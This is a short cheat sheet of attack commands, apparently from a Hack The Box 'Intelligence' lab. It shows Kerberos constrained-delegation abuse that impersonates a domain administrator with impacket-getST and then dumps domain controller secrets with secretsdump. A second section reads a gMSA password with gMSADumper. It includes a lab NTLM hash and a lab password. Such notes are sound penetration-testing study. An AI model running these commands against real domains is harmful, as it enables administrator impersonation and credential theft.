# AllowedToDelegate Abuse
```
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'ldap' -hashes :a9f4721de917a40fd9010ad815708184 intelligence.htb/svc_int$         # Get ST and ccache file

export KRB5CCNAME="/home/kali/cysec/practice/HTB/Windows/Intelligence/administrator@ldap_dc.intelligence.htb@INTELLIGENCE.HTB.ccache"       # Export ccache file

impacket-secretsdump -k dc.intelligence.htb -just-dc        # Dump creds - use fqdn instead of IP just like mentioned in spn
```

# ReadGMSAPassword Abuse
```
python /opt/Windows/gMSADumper/gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb      # To read the GMAS password or hash
```